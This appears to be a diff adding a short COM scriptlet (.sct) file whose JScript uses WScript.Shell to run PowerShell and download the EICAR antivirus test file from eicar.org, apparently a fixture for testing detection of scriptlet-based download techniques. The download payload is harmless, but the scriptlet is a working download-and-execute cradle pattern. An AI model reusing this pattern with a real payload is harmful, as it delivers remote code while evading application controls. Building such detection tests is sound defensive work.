@@ -1,0 +1,12 @@
+<?XML version="1.0"?>
+<scriptlet>
+    <registration
+    prodid="TESTING"
+    classid="{A111221-000-000-3000-00DA00DABFC}">
+        <script language="JScript">
+        <![CDATA[
+        var foo = new ActiveXObject("WScript.Shell").Run("powershell.exe Invoke-WebRequest -OutFile eicar.com http://www.eicar.org/download/eicar.com");
+        ]]>
+        </script>
+    </registration>
+</scriptlet>
